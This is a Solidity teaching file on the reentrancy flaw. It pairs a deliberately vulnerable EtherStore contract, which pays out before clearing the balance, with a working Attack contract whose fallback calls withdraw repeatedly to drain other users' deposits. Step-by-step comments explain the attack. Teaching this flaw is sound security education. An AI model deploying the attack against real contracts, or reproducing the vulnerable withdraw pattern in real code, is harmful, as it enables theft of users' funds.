// let's say that contract A calls contract B
// Reentrancy expoit allows B to call back into A before A finishes execution

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

/* 
    EtherStore is a contract where you can deposit and withdraw ETH
    This contract is vulnerable to re-entrancy attack.
    Let's see why

    1. Deploy EtherStore
    2. Deposit 1 Ether each from Account 1 (Alice) and account 2 (Bob) into EtherStore
    3. Deploy Attack with address of EtherStore
    4. Call Attack.attack sending 1 ether (using Account 3 (Eve))
        You will get 3 Ethers back (2 Ethers are stolen from Alice and Bob), 
        plus 1 Ether sent back from this contract

    What happened?
    Attack was able to call EtherStore.withdraw multiple times before
    EtherStore.withdraw finished executing

    Here is how the functions were called
    - Attack.attack
    - EtherStore.deposit
    - EtherStore.withdraw
    - Attack.fallback (receives 1 Ether)
    - EtherStore.withdraw
    - Attack.fallback (receives 1 Ether)
    - EtherStore.withdraw
    - Attack.fallback (receives 1 Ether)
 */

contract EtherStore {
    mapping (address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "Failed to send Ether");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}